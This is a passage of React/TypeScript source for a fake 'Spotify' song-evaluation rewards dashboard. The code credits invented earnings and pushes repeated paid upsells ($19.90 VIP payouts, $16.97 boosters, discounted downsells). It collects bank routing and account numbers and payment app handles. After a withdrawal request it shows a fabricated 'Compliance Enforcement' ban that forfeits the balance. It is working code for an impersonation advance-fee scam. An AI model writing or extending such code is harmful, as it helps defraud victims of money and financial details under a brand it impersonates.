    const emailKey = listenerEmail.toLowerCase();

    const syncCooldownTimer = () => {
      if (songsCompletedToday < dailySongLimit) return;

      let savedUntil = localStorage.getItem('spotify_cooldown_until_' + emailKey);
      if (!savedUntil) {
        const untilIso = new Date(Date.now() + 12 * 60 * 60 * 1000).toISOString();
        localStorage.setItem('spotify_cooldown_until_' + emailKey, untilIso);
        savedUntil = untilIso;
      }

      const diffSecs = Math.max(0, Math.ceil((new Date(savedUntil).getTime() - Date.now()) / 1000));
      setCooldownSecondsLeft(diffSecs);

      // When the 12-hour real-world wait has genuinely elapsed -> Advance to Next Day automatically!
      if (diffSecs <= 0) {
        const nextDay = currentDay + 1;
        const nextSongIdx = activeSongIndex + 1;
        localStorage.removeItem('spotify_cooldown_until_' + emailKey);
        localStorage.setItem('spotify_songs_completed_' + emailKey, '0');
        localStorage.setItem('spotify_today_earned_' + emailKey, '0');
        localStorage.setItem('spotify_current_day_' + emailKey, nextDay.toString());
        localStorage.setItem('spotify_active_song_index_' + emailKey, nextSongIdx.toString());

        setSongsCompletedToday(0);
        setTodayEarned(0);
        setCurrentDay(nextDay);
        setActiveSongIndex(nextSongIdx);
        setCooldownSecondsLeft(43200);

        supabase
          .from('listener_accounts')
          .update({
            songs_completed_today: 0,
            current_day: nextDay,
            active_song_index: nextSongIdx,
            cooldown_until: null,
          })
          .eq('email', emailKey)
          .then(() => {});
      }
    };

    syncCooldownTimer();
    const timer = setInterval(syncCooldownTimer, 1000);
    return () => clearInterval(timer);
  }, [songsCompletedToday, dailySongLimit, listenerEmail, currentDay, activeSongIndex]);

  // Format seconds to HH:MM:SS
  const formatCountdown = (secs: number) => {
    const hours = Math.floor(secs / 3600);
    const minutes = Math.floor((secs % 3600) / 60);
    const seconds = secs % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes
      .toString()
      .padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  // Initialize session, release date ($9 payment date + 14 days) and auth guard
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const isLogged = sessionStorage.getItem('spotify_logged_in') === 'true';
      const storedEmail = sessionStorage.getItem('spotify_listener_email') || localStorage.getItem('spotify_current_user');

      // Strict Auth Guard: If not logged in, redirect immediately to login screen
      if (!isLogged || !storedEmail) {
        router.replace('/spotify/dashboard/login');
        return;
      }

      // Check if account is permanently blocked (4 days after post-antifraud withdrawal)
      const banStatus = checkAccountFraudBanStatus(storedEmail);
      if (banStatus.isBanned) {
        setListenerEmail(storedEmail);
        setIsAccountBanned(true);
        setIsAuthChecking(false);
        return;
      }

      setIsAuthChecking(false);
      const storedName = sessionStorage.getItem('spotify_listener_name') || 'Verified Listener';
      setListenerEmail(storedEmail);
      setListenerName(storedName);

      // Check if returning from approved Upsell/Downsell Checkout (?upgraded=...)
      const urlParams = new URLSearchParams(window.location.search);
      const upgradedOffer = urlParams.get('upgraded') as OfferIdType | null;
      if (upgradedOffer) {
        unlockOfferBenefitAfterPayment(storedEmail, upgradedOffer).catch(() => {});
        if (upgradedOffer === 'upsell_vip_19_90' || upgradedOffer === 'downsell_vip_11_90') {
          setUpgradedBannerMessage(
            'Payment Approved! Your VIP Gold 7-Day Fast Payout Pass is now active. Your payout schedule has been cut in half to 7 days!'
          );
        } else if (upgradedOffer === 'upsell_booster3_16_97') {
          setUpgradedBannerMessage(
            'Payment Approved! Your +3 Extra Daily Tracks Booster is active (6 tracks/day limit). Your next track is ready below!'
          );
          setIsEvaluating(true);
        } else if (upgradedOffer === 'downsell_booster2_9_12') {
          setUpgradedBannerMessage(
            'Payment Approved! Your +2 Extra Daily Tracks Booster is active (5 tracks/day limit). Your next track is ready below!'
          );
          setIsEvaluating(true);
        } else if (upgradedOffer === 'upsell_skip12h_9_65') {
          setUpgradedBannerMessage(
            'Payment Approved! 12-Hour Cooldown Timer bypassed. Your daily counter has been reset and your new track queue is ready!'
          );
          setIsEvaluating(true);
        }
        // Clean URL parameter without reloading
        window.history.replaceState({}, '', '/spotify/dashboard');
      }

      // Restore VIP & Cadence state
      const emailKeyInit = storedEmail.toLowerCase();
      const vipStatus = localStorage.getItem('spotify_vip_7day_' + emailKeyInit) === 'true';
      if (vipStatus) {
        setIsVip7Day(true);
        setAccountTier('VIP Gold Tier');
      }

      const savedCadenceDeclined = localStorage.getItem('spotify_cadence_declined_' + emailKeyInit) === 'true';
      if (savedCadenceDeclined) {
        setCadenceUpsellDeclined(true);
      }

      // Restore Current Day (Day 1, Day 2, ... Day 7)
      const savedDay = localStorage.getItem('spotify_current_day_' + emailKeyInit);
      const parsedDay = savedDay ? Math.max(1, parseInt(savedDay, 10) || 1) : 1;
      setCurrentDay(parsedDay);

      // Restore Songs Completed Today, Active Song Index, Balance & Daily Limit
      const savedCount = localStorage.getItem('spotify_songs_completed_' + emailKeyInit);
      const parsedCount = savedCount !== null ? parseInt(savedCount, 10) || 0 : 0;
      setSongsCompletedToday(parsedCount);

      // Pre-set next song reward preview based on currentDay and parsedCount
      setEvaluationReward(getProgressiveSongReward(parsedDay, parsedCount));

      const savedSongIndex = localStorage.getItem('spotify_active_song_index_' + emailKeyInit);
      if (savedSongIndex !== null) {
        setActiveSongIndex(parseInt(savedSongIndex, 10));
      } else if (savedCount !== null) {
        setActiveSongIndex(parsedCount);
      }

      const savedBalance = localStorage.getItem('spotify_account_balance_' + emailKeyInit);
      if (savedBalance) {
        setAccountBalance(parseFloat(savedBalance));
      }

      const savedTodayEarned = localStorage.getItem('spotify_today_earned_' + emailKeyInit);
      if (savedTodayEarned) {
        setTodayEarned(parseFloat(savedTodayEarned));
      }

      const savedLimit = localStorage.getItem('spotify_daily_limit_' + emailKeyInit);
      if (savedLimit) setDailySongLimit(parseInt(savedLimit, 10));

      const savedCooldownUntil = localStorage.getItem('spotify_cooldown_until_' + emailKeyInit);
      if (savedCooldownUntil) {
        const diffSecs = Math.max(0, Math.ceil((new Date(savedCooldownUntil).getTime() - Date.now()) / 1000));
        setCooldownSecondsLeft(diffSecs);
      }

      // Calculate exact release date: Standard 15 days vs VIP 7 days
      const storedPaymentDate = sessionStorage.getItem('spotify_payment_date') || localStorage.getItem('spotify_payment_date');
      const baseDate = storedPaymentDate ? new Date(storedPaymentDate) : new Date();
      const daysToAdd = vipStatus ? 7 : 15;
      const calcRelease = new Date(baseDate.getTime() + daysToAdd * 24 * 60 * 60 * 1000);
      setReleaseDateFormatted(
        calcRelease.toLocaleDateString('en-US', {
          month: 'short',
          day: 'numeric',
          year: 'numeric',
        })
      );

      // Check real saved payout coordinates
      const rawPayout = sessionStorage.getItem('spotify_payout_details') || localStorage.getItem('spotify_payout_' + storedEmail.toLowerCase());
      if (rawPayout) {
        try {
          const parsed = JSON.parse(rawPayout);
          if (parsed.method) setEditMethod(parsed.method);
          if (parsed.bank_name) setEditBankName(parsed.bank_name);
          if (parsed.routing_number) setEditRoutingNumber(parsed.routing_number);
          if (parsed.account_number) setEditAccountNumber(parsed.account_number);
          if (parsed.zelle_tag) setEditZelleTag(parsed.zelle_tag);
          if (parsed.cashapp_tag) setEditCashappTag(parsed.cashapp_tag);
          if (parsed.paypal_email) setEditPaypalEmail(parsed.paypal_email);
          if (parsed.apple_cash_phone) setEditAppleCashPhone(parsed.apple_cash_phone);

          if (parsed.method === 'direct_deposit') {
            const last4 = parsed.account_number ? parsed.account_number.slice(-4) : '••••';
            setPayoutMethodInfo({
              method: 'Direct Deposit (ACH)',
              target: `${parsed.bank_name || 'Bank Account'} (••••${last4})`,
            });
          } else if (parsed.method === 'zelle') {
            setPayoutMethodInfo({
              method: 'Zelle',
              target: parsed.zelle_tag || storedEmail,
            });
          } else if (parsed.method === 'cashapp') {
            setPayoutMethodInfo({
              method: 'Cash App',
              target: parsed.cashapp_tag || '$cashtag',
            });
          } else if (parsed.method === 'paypal') {
            setPayoutMethodInfo({
              method: 'PayPal',
              target: parsed.paypal_email || storedEmail,
            });
          } else if (parsed.method === 'apple_cash') {
            setPayoutMethodInfo({
              method: 'Apple Cash',
              target: parsed.apple_cash_phone || storedEmail,
            });
          }
        } catch {}
      }

      // Check whether user has already accepted the mandatory guidelines contract & created password
      const emailKey = storedEmail.toLowerCase();
      const termsAccepted = localStorage.getItem('spotify_terms_accepted_' + emailKey);
      const hasPassword =
        localStorage.getItem('spotify_password_created_' + emailKey) === 'true' ||
        !!localStorage.getItem('spotify_auth_' + emailKey);

      if (!termsAccepted) {
        setShowAgreementModal(true);
      } else if (!hasPassword) {
        setShowCreatePasswordModal(true);
      } else {
        // If terms accepted and password set, check if user has seen payout cadence upsell
        const cadenceSeen = localStorage.getItem('spotify_cadence_seen_' + emailKey);
        if (!cadenceSeen && !vipStatus) {
          setShowCadenceUpsellModal(true);
          recordFunnelEvent({
            email: storedEmail,
            full_name: storedName || 'Verified Listener',
            offer_id: 'upsell_vip_19_90',
            offer_name: 'Upsell #1: Saque VIP 7 Dias',
            amount: 19.90,
            action: 'viewed',
          }).catch(() => {});
        }
      }
    }
  }, [router]);

  // Handle Terms Acceptance -> Opens Password Setup Modal (or Cadence Upsell if password already exists)
  const handleAcceptTerms = () => {
    if (!agreementChecked) return;
    const emailKey = listenerEmail.toLowerCase();
    if (typeof window !== 'undefined') {
      localStorage.setItem('spotify_terms_accepted_' + emailKey, 'true');
    }
    if (listenerEmail) {
      updateListenerTermsInSupabase(listenerEmail).catch(() => {});
    }
    setShowAgreementModal(false);

    const hasPassword =
      typeof window !== 'undefined' &&
      (localStorage.getItem('spotify_password_created_' + emailKey) === 'true' ||
        !!localStorage.getItem('spotify_auth_' + emailKey));

    if (!hasPassword) {
      setShowCreatePasswordModal(true);
      return;
    }

    // Prompt Payout Cadence Upsell Modal ($19.90) if password already exists
    if (!isVip7Day) {
      setShowCadenceUpsellModal(true);
      recordFunnelEvent({
        email: listenerEmail,
        full_name: listenerName,
        offer_id: 'upsell_vip_19_90',
        offer_name: 'Upsell #1: Saque VIP 7 Dias',
        amount: 19.90,
        action: 'viewed',
      }).catch(() => {});
    }
  };

  // Handle Saving Password Right After Guidelines
  const handleSaveFirstPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setPasswordError(null);
    const cleanPass = newAccountPassword.trim();
    if (cleanPass.length < 4) {
      setPasswordError('Please enter a password with at least 4 characters.');
      return;
    }

    setIsSavingPassword(true);
    const emailToSave = listenerEmail || 'listener@spotifyrewards.com';
    const emailKey = emailToSave.toLowerCase();

    await saveListenerAccount(emailToSave, cleanPass, listenerName || 'Verified Listener');
    await updateListenerTermsInSupabase(emailToSave).catch(() => {});

    if (typeof window !== 'undefined') {
      localStorage.setItem('spotify_password_created_' + emailKey, 'true');
      sessionStorage.setItem('spotify_logged_in', 'true');
    }

    setIsSavingPassword(false);
    setShowCreatePasswordModal(false);

    // Trigger Cadence Upsell Modal ($19.90) right after password is saved
    if (!isVip7Day) {
      setShowCadenceUpsellModal(true);
      recordFunnelEvent({
        email: emailToSave,
        full_name: listenerName,
        offer_id: 'upsell_vip_19_90',
        offer_name: 'Upsell #1: Saque VIP 7 Dias',
        amount: 19.90,
        action: 'viewed',
      }).catch(() => {});
    }
  };

  // Track scrolling inside the compact agreement modal
  const handleScrollTerms = () => {
    if (termsScrollRef.current) {
      const { scrollTop, scrollHeight, clientHeight } = termsScrollRef.current;
      if (scrollTop + clientHeight >= scrollHeight - 60) {
        setHasScrolledTerms(true);
      }
    }
  };

  // Handle Accepting Cadence Upsell ($19.90) -> Redirects to Personalized Checkout Page
  const handleAcceptCadenceUpsell = () => {
    if (typeof window !== 'undefined') {
      localStorage.setItem('spotify_cadence_seen_' + listenerEmail.toLowerCase(), 'true');
    }
    setShowCadenceUpsellModal(false);
    router.push('/payment?offer=upsell_vip_19_90');
  };

  // Handle Declining Cadence Upsell ($19.90) -> Prepares Downsell ($11.90) for after song 2
  const handleDeclineCadenceUpsell = () => {
    if (typeof window !== 'undefined') {
      const emailKey = listenerEmail.toLowerCase();
      localStorage.setItem('spotify_cadence_seen_' + emailKey, 'true');
      localStorage.setItem('spotify_cadence_declined_' + emailKey, 'true');
    }
    setCadenceUpsellDeclined(true);
    setShowCadenceUpsellModal(false);
    recordFunnelEvent({
      email: listenerEmail,
      full_name: listenerName,
      offer_id: 'upsell_vip_19_90',
      offer_name: 'Upsell #1: Saque VIP 7 Dias',
      amount: 19.90,
      action: 'declined',
    }).catch(() => {});
  };

  // Handle Accepting Cadence Downsell ($11.90) -> Redirects to Personalized Checkout Page
  const handleAcceptCadenceDownsell = () => {
    setShowCadenceDownsellModal(false);
    router.push('/payment?offer=downsell_vip_11_90');
  };

  const handleUpdatePayoutInModal = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsUpdatingPayout(true);
    const emailToUse = listenerEmail || 'listener@spotifyrewards.com';
    const payload = {
      email: emailToUse,
      method: editMethod,
      bank_name: editBankName,
      routing_number: editRoutingNumber,
      account_number: editAccountNumber,
      zelle_tag: editZelleTag,
      cashapp_tag: editCashappTag,
      paypal_email: editPaypalEmail,
      apple_cash_phone: editAppleCashPhone,
    };

    await savePayoutCoordinates(payload);

    if (editMethod === 'direct_deposit') {
      const last4 = editAccountNumber ? editAccountNumber.slice(-4) : '••••';
      setPayoutMethodInfo({
        method: 'Direct Deposit (ACH)',
        target: `${editBankName || 'Bank Account'} (••••${last4})`,
      });
    } else if (editMethod === 'zelle') {
      setPayoutMethodInfo({ method: 'Zelle', target: editZelleTag || emailToUse });
    } else if (editMethod === 'cashapp') {
      setPayoutMethodInfo({ method: 'Cash App', target: editCashappTag || '$cashtag' });
    } else if (editMethod === 'paypal') {
      setPayoutMethodInfo({ method: 'PayPal', target: editPaypalEmail || emailToUse });
    } else if (editMethod === 'apple_cash') {
      setPayoutMethodInfo({ method: 'Apple Cash', target: editAppleCashPhone || emailToUse });
    }

    setIsUpdatingPayout(false);
    setUpdateSuccess(true);
    setTimeout(() => setUpdateSuccess(false), 3000);
  };

  const handleRequestWithdrawal = () => {
    setWithdrawalRequestedMessage(
      `Withdrawal request for $${accountBalance.toFixed(2)} USD is QUEUED under 15-day compliance hold protocol. Scheduled automatic clearing date: ${releaseDateFormatted || 'Nov 26, 2026'}.`
    );
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = Math.floor(seconds % 60);
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleTimeUpdate = () => {
    if (audioRef.current) {
      let cur = audioRef.current.currentTime;
      const dur = audioRef.current.duration || 165;

      // Prevent user from seeking forward past what they have genuinely listened to
      if (cur > maxPlayedTimeRef.current + 2.5 && !previewUnlocked) {
        audioRef.current.currentTime = maxPlayedTimeRef.current;
        cur = maxPlayedTimeRef.current;
      } else if (cur > maxPlayedTimeRef.current) {
        maxPlayedTimeRef.current = cur;
      }

      setAudioCurrentTime(cur);
      setAudioDuration(dur);

      // Calculate progress percentage based on 90 seconds (1:30)
      const percent = Math.min(100, (cur / 90) * 100);
      setAudioProgress(percent);

      if (cur >= 90) {
        setPreviewUnlocked(true);
      }
    }
  };

  const handleAudioEnded = () => {
    setIsPlayingAudio(false);
    if (audioCurrentTime >= 90) {
      setPreviewUnlocked(true);
    }
  };

  const toggleAudio = () => {
    if (isPlayingAudio) {
      setIsPlayingAudio(false);
      if (audioRef.current) audioRef.current.pause();
    } else {
      setIsPlayingAudio(true);
      if (audioRef.current) {
        audioRef.current.play().catch(() => {});
      }
    }
  };

  const handleCompleteEvaluation = () => {
    if (!question1Answer || !question2Answer || !question3Answer || !question4Answer) return;

    // Stop audio playback cleanly upon completing evaluation
    if (audioRef.current) {
      audioRef.current.pause();
    }
    setIsPlayingAudio(false);

    // Progressive daily earnings: Day 1 = $98.23 across 3 songs, increasing each day up to Day 7+
    const currentReward = getProgressiveSongReward(currentDay, songsCompletedToday);
    setEvaluationReward(currentReward);
    setEvaluationCompleted(true);

    const newTodayEarned = +(todayEarned + currentReward).toFixed(2);
    setTodayEarned(newTodayEarned);

    const newBalance = +(accountBalance + currentReward).toFixed(2);
    setAccountBalance(newBalance);

    const newCompletedCount = songsCompletedToday + 1;
    setSongsCompletedToday(newCompletedCount);

    const emailKey = listenerEmail.toLowerCase();
    let cooldownUntilIso: string | null = null;

    if (typeof window !== 'undefined') {
      localStorage.setItem('spotify_songs_completed_' + emailKey, newCompletedCount.toString());
      localStorage.setItem('spotify_account_balance_' + emailKey, newBalance.toString());
      localStorage.setItem('spotify_today_earned_' + emailKey, newTodayEarned.toString());
      localStorage.setItem('spotify_current_day_' + emailKey, currentDay.toString());

      // If daily limit reached, lock in the real 12-hour cooldown timestamp so refresh cannot bypass it
      if (newCompletedCount >= dailySongLimit) {
        cooldownUntilIso = new Date(Date.now() + 12 * 60 * 60 * 1000).toISOString();
        localStorage.setItem('spotify_cooldown_until_' + emailKey, cooldownUntilIso);
        setCooldownSecondsLeft(43200);
      }
    }

    // Record in Supabase listener_progress & update daily status
    if (listenerEmail) {
      recordListenerEvaluation({
        listener_email: listenerEmail,
        song_id: currentTrack.id,
        song_title: currentTrack.title,
        artist: currentTrack.artist,
        listen_duration_seconds: Math.max(90, Math.floor(audioCurrentTime)),
        answer_1: question1Answer,
        answer_2: `${question2Answer} | ${question3Answer} | ${question4Answer}`,
        reward_amount: currentReward,
      }).catch(() => {});

      supabase
        .from('listener_accounts')
        .update({
          songs_completed_today: newCompletedCount,
          current_day: currentDay,
          active_song_index: activeSongIndex,
          ...(cooldownUntilIso ? { cooldown_until: cooldownUntilIso } : {}),
        })
        .eq('email', emailKey)
        .then(() => {});
    }

    // Play cash confirmation sound
    try {
      const chime = new Audio('/audio/cash-confirmation.mp3');
      chime.play().catch(() => {});
    } catch {}

    // Trigger Downsell Cadence Modal ($11.90) after 2 completed songs if declined earlier
    if (newCompletedCount === 2 && cadenceUpsellDeclined && !isVip7Day) {
      setTimeout(() => {
        setShowCadenceDownsellModal(true);
        recordFunnelEvent({
          email: listenerEmail,
          full_name: listenerName,
          offer_id: 'downsell_vip_11_90',
          offer_name: 'Downsell #1: Saque VIP 7 Dias (40% OFF)',
          amount: 11.90,
          action: 'viewed',
        }).catch(() => {});
      }, 1200);
    }

    // Trigger Task Booster Modal ($16.97) when daily limit is reached
    if (newCompletedCount >= dailySongLimit) {
      setTimeout(() => {
        setShowTaskBoosterUpsellModal(true);
        recordFunnelEvent({
          email: listenerEmail,
          full_name: listenerName,
          offer_id: 'upsell_booster3_16_97',
          offer_name: 'Upsell #2: Booster +3 Músicas/Dia',
          amount: 16.97,
          action: 'viewed',
        }).catch(() => {});
      }, 1500);
    }
  };

  const handleLogout = () => {
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('spotify_logged_in');
    }
    router.push('/spotify/dashboard/login');
  };

  if (isAuthChecking) {
    return (
      <div className="min-h-screen bg-[#121212] flex items-center justify-center text-white text-xs font-mono">
        <div className="flex items-center gap-2">
          <span className="w-2 h-2 rounded-full bg-[#1db954] animate-ping" />
          <span>Verifying member session...</span>
        </div>
      </div>
    );
  }

  if (isAccountBanned) {
    return (
      <div className="min-h-screen bg-[#090909] text-white flex items-center justify-center p-4 font-sans selection:bg-red-500 selection:text-white">
        <div className="max-w-lg w-full bg-[#121212] border-2 border-red-500/50 rounded-3xl p-6 sm:p-9 shadow-2xl space-y-6 text-center">
          <div className="w-16 h-16 mx-auto rounded-2xl bg-red-500/15 border border-red-500/40 text-red-500 flex items-center justify-center">
            <Ban className="w-9 h-9 stroke-[2.2]" />
          </div>

          <div className="space-y-2">
            <span className="px-3 py-1 rounded-full bg-red-500/20 border border-red-500/40 text-red-400 text-[10px] font-black uppercase tracking-widest">
              COMPLIANCE ENFORCEMENT DIVISION • CASE #SPT-FRAUD-8921
            </span>
            <h1 className="text-2xl sm:text-3xl font-black text-white tracking-tight pt-1">
              Account Permanently Blocked
            </h1>
            <p className="text-xs sm:text-sm text-red-300 font-semibold">
              Access Revoked Due to Anti-Fraud &amp; Participant Guideline Violations
            </p>
          </div>

          <div className="p-4 sm:p-5 rounded-2xl bg-[#181212] border border-red-500/30 text-left space-y-3 text-xs text-gray-300 leading-relaxed">
            <p className="text-white font-bold">
              Official Notice of Termination ({listenerEmail}):
            </p>
            <p>
              Following the mandatory 96-hour final clearinghouse compliance audit of your withdrawal request, our automated telemetry and identity reconciliation systems flagged severe violations of the <b>Master Listener Agreement</b> accepted upon registration:
            </p>
            <ul className="space-y-1.5 text-[11px] text-red-200/90 pl-1">
              <li>
                • <b>Section 2.2 &amp; 2.3 (Telemetry &amp; Evaluation Anomaly):</b> Irregular acoustic playback patterns and non-compliant response entropy detected across evaluated catalog tracks.
              </li>
              <li>
                • <b>Section 6.3 &amp; 9.1 (Anti-Fraud &amp; Identity Compliance):</b> Clearinghouse security audit failed final anti-fraud risk scoring during outbound settlement verification.
              </li>
            </ul>
            <p className="text-[11px] text-gray-400 pt-1 border-t border-red-500/20">
              In accordance with <b>Section 9.2</b> of the Program Guidelines, your listener account has been permanently de-authorized, all pending escrow balances and royalties have been forfeited, and portal access is permanently denied.
            </p>
          </div>

          <button
            type="button"
            onClick={handleLogout}
            className="w-full py-3.5 px-6 rounded-full bg-red-600 hover:bg-red-500 text-white font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
          >
            Exit Portal
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#121212] text-[#e0e0e0] font-sans antialiased selection:bg-[#1db954] selection:text-black relative">
      <MetaPixelTracker eventName="PageView" customData={{ content_name: 'Spotify Evaluator Dashboard' }} />
      {/* ========================================================================= */}
      {/* 1. CADENCE UPSELL MODAL (15-Day Standard vs 7-Day VIP for +$19.90)       */}
      {/* ========================================================================= */}
      {showCadenceUpsellModal && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-md bg-[#0a0a0a] border border-[#2a2a2a] rounded-3xl p-6 sm:p-7 shadow-2xl space-y-5 text-white">
            <div className="flex items-center justify-between border-b border-[#1f1f1f] pb-4">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-full bg-amber-400/10 text-amber-400 flex items-center justify-center border border-amber-400/30">
                  <Sparkles className="w-4 h-4" />
                </div>
                <div>
                  <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 block">
                    Account Cadence Status
                  </span>
                  <h3 className="text-sm font-extrabold text-white">
                    Payout Schedule Notification
                  </h3>
                </div>
              </div>
            </div>

            <div className="space-y-3 text-xs leading-relaxed text-gray-300">
              <div className="p-3.5 rounded-2xl bg-[#121212] border border-[#222222]">
                <span className="font-bold text-gray-200 block mb-1">
                  📅 Standard Listener Account (Default):
                </span>
                <p className="text-gray-400 text-[11px]">
                  Your earned evaluation royalties are currently scheduled for bi-weekly clearance (every <b>15 calendar days</b>). Next release: <b className="text-white">{releaseDateFormatted}</b>.
                </p>
              </div>

              <div className="p-4 rounded-2xl bg-gradient-to-br from-[#122217] via-[#0b1810] to-[#121212] border border-[#1db954]/50 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-black uppercase text-[#1db954] flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4" />
                    <span>VIP Gold Fast Payout Pass</span>
                  </span>
                  <span className="bg-[#1db954] text-black font-black text-[10px] px-2 py-0.5 rounded-full">
                    +$19.90 USD
                  </span>
                </div>
                <p className="text-xs text-gray-200 font-semibold">
                  Upgrade your account to receive payouts every <b>7 DAYS</b> instead of 15 days, with instant clearing priority!
                </p>
              </div>
            </div>

            <div className="space-y-2 pt-2">
              <button
                type="button"
                onClick={handleAcceptCadenceUpsell}
                className="w-full py-3.5 px-4 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>UPGRADE TO 7-DAY PAYOUTS (+$19.90)</span>
                <ArrowRight className="w-4 h-4 stroke-[3]" />
              </button>

              <button
                type="button"
                onClick={handleDeclineCadenceUpsell}
                className="w-full py-2.5 px-4 rounded-full bg-transparent hover:bg-[#181818] text-gray-400 hover:text-gray-200 font-bold text-xs transition-colors cursor-pointer"
              >
                Continue with Standard 15-Day Payouts
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 2. CADENCE DOWNSELL MODAL (VIP 7-Day Discount for +$11.90 after 2 songs)  */}
      {/* ========================================================================= */}
      {showCadenceDownsellModal && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-md bg-[#0a0a0a] border border-amber-500/40 rounded-3xl p-6 sm:p-7 shadow-2xl space-y-5 text-white">
            <div className="flex items-center justify-between border-b border-[#222] pb-4">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-full bg-amber-500/20 text-amber-400 flex items-center justify-center border border-amber-500/40">
                  <TrendingUp className="w-4 h-4" />
                </div>
                <div>
                  <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 block">
                    EXCLUSIVE 40% DISCOUNT OFFER
                  </span>
                  <h3 className="text-sm font-extrabold text-white">
                    VIP 7-Day Payout Fast-Track
                  </h3>
                </div>
              </div>
              <button
                onClick={() => setShowCadenceDownsellModal(false)}
                className="text-gray-400 hover:text-white p-1"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3 text-xs leading-relaxed text-gray-300">
              <p className="text-sm text-gray-100 font-medium">
                You&apos;ve evaluated <b>2 songs</b> today! As an active evaluator, you qualify for a one-time VIP Payout Upgrade discount.
              </p>

              <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-200 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="font-extrabold text-white">VIP 7-Day Payout Pass</span>
                  <div className="text-right">
                    <span className="text-xs text-gray-400 line-through mr-1.5">$19.90</span>
                    <span className="text-sm font-black text-amber-400">$11.90 USD</span>
                  </div>
                </div>
                <p className="text-[11px] text-amber-300">
                  Cut your waiting time in half! Receive direct payouts every 7 days forever.
                </p>
              </div>
            </div>

            <div className="space-y-2 pt-2">
              <button
                type="button"
                onClick={handleAcceptCadenceDownsell}
                className="w-full py-3.5 px-4 rounded-full bg-amber-400 hover:bg-amber-300 text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-amber-400/20 flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>CLAIM VIP 7-DAY PAYOUTS ($11.90)</span>
                <ArrowRight className="w-4 h-4 stroke-[3]" />
              </button>

              <button
                type="button"
                onClick={() => {
                  setShowCadenceDownsellModal(false);
                  recordFunnelEvent({
                    email: listenerEmail,
                    full_name: listenerName,
                    offer_id: 'downsell_vip_11_90',
                    offer_name: 'Downsell #1: Saque VIP 7 Dias (40% OFF)',
                    amount: 11.90,
                    action: 'declined',
                  }).catch(() => {});
                }}
                className="w-full py-2.5 px-4 rounded-full bg-transparent hover:bg-[#181818] text-gray-400 hover:text-gray-200 font-bold text-xs transition-colors cursor-pointer"
              >
                No thanks, keep 15-day schedule
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 3. TASK BOOSTER UPSELL MODAL (+3 Songs/day for +$16.97)                    */}
      {/* ========================================================================= */}
      {showTaskBoosterUpsellModal && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-md bg-[#0a0a0a] border border-[#1db954]/50 rounded-3xl p-6 sm:p-7 shadow-2xl space-y-5 text-white">
            <div className="flex items-center justify-between border-b border-[#222] pb-4">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-full bg-[#1db954]/20 text-[#1db954] flex items-center justify-center border border-[#1db954]/40">
                  <Sparkles className="w-4 h-4" />
                </div>
                <div>
                  <span className="text-[10px] font-black uppercase tracking-wider text-[#1db954] block">
                    DAILY TASK LIMIT REACHED (3/3)
                  </span>
                  <h3 className="text-sm font-extrabold text-white">
                    Unlock +3 Extra Tracks Daily
                  </h3>
                </div>
              </div>
            </div>

            <div className="space-y-3 text-xs leading-relaxed text-gray-300">
              <p className="text-sm text-gray-200">
                You reached today&apos;s standard queue limit of <b>3 tracks</b> (earned ~<b>${todayEarned.toFixed(2)} USD</b>).
              </p>

              <div className="p-4 rounded-2xl bg-gradient-to-br from-[#0e2215] to-[#121212] border border-[#1db954]/40 space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="font-extrabold text-white text-xs uppercase tracking-wide">
                    Task Booster Tier 2
                  </span>
                  <span className="bg-[#1db954] text-black font-black text-xs px-2.5 py-0.5 rounded-full">
                    +$16.97 USD
                  </span>
                </div>
                <p className="text-xs text-gray-200">
                  Increase your daily capacity from <b>3 to 6 tracks/day</b> and boost potential earnings up to <b>+$150.00 USD/day</b>!
                </p>
              </div>
            </div>

            <div className="space-y-2 pt-2">
              <button
                type="button"
                onClick={() => {
                  setShowTaskBoosterUpsellModal(false);
                  router.push('/payment?offer=upsell_booster3_16_97');
                }}
                className="w-full py-3.5 px-4 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>ACTIVATE +3 TRACKS BOOSTER (+$16.97)</span>
                <ArrowRight className="w-4 h-4 stroke-[3]" />
              </button>

              <button
                type="button"
                onClick={() => {
                  setShowTaskBoosterUpsellModal(false);
                  setShowTaskBoosterDownsellModal(true);
                  recordFunnelEvent({
                    email: listenerEmail,
                    full_name: listenerName,
                    offer_id: 'upsell_booster3_16_97',
                    offer_name: 'Upsell #2: Booster +3 Músicas/Dia',
                    amount: 16.97,
